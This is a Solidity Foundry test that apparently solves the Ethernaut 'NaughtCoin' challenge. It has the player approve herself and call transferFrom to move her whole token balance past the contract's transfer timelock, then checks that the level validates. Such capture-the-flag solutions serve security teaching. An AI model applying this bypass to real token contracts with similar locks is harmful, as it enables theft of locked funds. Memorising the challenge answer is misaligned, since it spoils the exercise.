// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "../src/NaughtCoin/NaughtCoin.sol";
import "../src/NaughtCoin/NaughtCoinFactory.sol";
import {Test} from "forge-std/Test.sol";

contract NaughtCoinTest is Test {
    address _alice;
    address Bob;

    function setUp() public {
        _alice = makeAddr("alice");
        Bob = makeAddr("bob");
        vm.deal(_alice, 5 ether);
    }

    function testNaughtCoin() public {
        NaughtCoinFactory factory = new NaughtCoinFactory();
        address instance = factory.createInstance(_alice);
        vm.startPrank(_alice);
        uint256 balance = NaughtCoin(instance).balanceOf(_alice);
        NaughtCoin(instance).approve(_alice, balance);
        bool success = NaughtCoin(instance).transferFrom(_alice, Bob, balance);
        require(success, "falied");
        assertTrue(factory.validateInstance(payable(instance), _alice));
    }
}
